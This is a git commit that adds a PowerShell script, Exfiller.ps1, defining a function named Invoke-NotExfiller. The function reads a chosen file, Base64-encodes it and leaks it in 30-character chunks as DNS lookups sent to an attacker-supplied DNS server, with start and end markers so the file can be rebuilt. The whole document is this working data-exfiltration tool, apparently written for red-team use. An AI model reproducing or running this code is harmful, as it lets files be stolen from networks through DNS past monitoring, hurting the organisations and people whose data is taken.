2f7454621f3a524696aa5d03f932f0ba573272f6
imflikk <58894272+imflikk@users.noreply.github.com>
2022-02-12 22:11:11 -0800

    Started PowerShell version of file

---
+++ Exfiller.ps1
@@ -0,0 +1,67 @@
+function Invoke-NotExfiller {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory=$true)][string]$DNSServer,
+        [Parameter(Mandatory=$true)][string]$File,
+        [Parameter(Mandatory=$false)][int]$RequestLength
+    )
+
+    # Set default optional values if not set on command line
+    if (!$RequestLength) { $RequestLength = 30 }
+
+    $targetDomain = ".test.local"
+
+    # Check the given file path is valid
+    If (-Not (Test-Path -Path $File)) 
+    {
+        Write-Output "[-] Error accessing file: '$File'!"
+        Exit(-1)
+    }
+
+    # Get bytes from the target file and convert to Base64
+    $fileContentBytes = [System.IO.File]::ReadAllBytes($File)
+    $fileContentB64 = [Convert]::ToBase64String($fileContentBytes)
+
+    # Replace equals with dash to make it URL safe
+    $fileContentB64 = $fileContentB64.replace('=', '-')
+    $fileContentB64 = $fileContentB64.replace('/', '-0-')
+    $fileContentB64 = $fileContentB64.replace('+', '-00-')
+
+    $totalRequests = [Math]::Floor($fileContentB64.Length/$RequestLength)+2
+
+    Write-Output "[*] Sending a total of $totalRequests DNS requests to $DNSServer"
+
+    # Send start of file identifier
+    $requestString = "11111" + $File.replace('.', '-').replace('\', '') + "11111" + $targetDomain
+    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
+
+    # Set up counter to count total number of requests
+    $counter = 0
+
+    # Loop over Base64 data sending the specific number of characters per request
+    for ($i=0; $i -lt $fileContentB64.Length; $i += 30) {
+        try {
+            $requestString = $fileContentB64.substring($i, 30) + $targetDomain
+            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
+            $counter++
+        }
+        catch {
+            $requestString = $fileContentB64.substring($i) + $targetDomain
+            Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
+            $counter++
+        }
+    }
+
+    # Send end of file identifier
+    $requestString = "000000000000000" + $targetDomain
+    Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
+
+
+    Write-Output "[+] Successfully sent file '$File' over a total of $totalRequests requests to $DNSServer"
+
+    #### 
+    # Below can be used for troubleshooting to ensure the data is converted correctly
+    ####
+    # $fileContentOriginal = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($fileContentB64))
+    # Write-Output "Original: $fileContentOriginal"
+}
